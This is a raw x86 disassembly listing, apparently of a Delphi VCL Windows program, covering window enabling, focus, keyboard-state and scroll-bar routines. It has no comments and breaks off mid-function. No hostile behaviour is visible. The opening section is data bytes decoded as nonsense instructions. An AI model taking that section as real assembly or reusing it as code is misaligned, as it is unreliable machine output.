add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 8 - 0x252bffbc ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
fiadd [ eax + eax - 0x60 ]
add [ eax ] al
add [ eax ] cl
sub al [ ecx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al ch
inc edi
inc ebp
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0xe004546 ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
aam 0xda
inc esp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
test dl bl
inc esp
add [ ebx + ebp ] al
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
xor al [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
jb r-xdata
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x59 ] ah
inc ebp
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ edi + edx * 2 + 0x45 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
cmp al 0x0
add [ eax ] al
fdivr [ esi ]
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] ch
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
nop
pop esp
fild [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 8 - 0x2427ffbc ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
fild [ eax + eax + 0x40 ]
add [ eax ] eax
add [ eax ] cl
sub al [ ecx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x8400408d
fiadd [ eax + eax ]
xor al [ eax ]
test [ edx ] dh
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
outsb
arpl [ eax - 0x70 ] bp
sub al 0xda
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 8 ] ch
inc esp
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x54080040 ] al
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
fcomp st3
inc esp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
pop esp
fild [ eax + eax + 0x4 ]
sub eax [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add [ ecx + rw-data ] ah
retn
sub_44dc08
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_44dc54
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45735c
mov eax [ rw-data ]
call sub_41abe4
mov eax [ rw-data ]
call sub_41ab8c
retn
push 0x0
push eax
call ShowOwnedPopups
sub_44dc8c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026e4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_44dcdc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_44dd7f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44dd48
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_44dc8c
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd86
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_44dd90
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402704
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_44ddc8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_44de2c
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_44ddc8
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_44de88
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_44dea8
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_44de88
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_44ded4
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45493c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_454dac
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407cc0
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454928
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454d98
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407cc0
test eax eax
je r-xdata
sub_44df5c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44dfb0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44dfec
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_44e038
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e096
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44bbd4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404238
mov eax [ ebp - 0x8 ]
pop edx
call sub_407cc0
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e09d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
sub_44e0a8
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_44e0d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_44e141
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44e0a8
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e148
lea eax [ ebp - 0xc ]
call sub_404050
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
sub_44e150
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_44e1e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41476c
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_44eaa8
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_44ea88
mov edx [ edi + 0xc ]
mov eax ebx
call sub_44e938
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e230
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44e3e8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_437e38
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_44e938
xor edx edx
mov eax ebx
call sub_44e938
jmp r-xdata
sub_44e268
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4232f8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44e2d4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4232f8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44e33c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_44ea70
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43ac9c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_44ea70
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43ac60
call sub_44e2d4
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43ac60
call sub_44e268
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_44e3e8
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_43df6c
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44e420
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_44e454
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44e420
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44e420
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_44e4d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_44e454
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4371b0
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_44e454
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4371f4
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44e568
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_44e5c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_44e799 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e4d0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e4d0
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44e938
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
push ebp
call sub_44e568
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
push ebp
call sub_44e568
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406998
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44e938
jmp r-xdata
sub_44e8c0
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44efb0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_44e938
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_43df6c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_43df6c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_43db24
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_43db24
jmp r-xdata
call sub_44e0a8
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44e9fc
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44efb0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_44eab4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
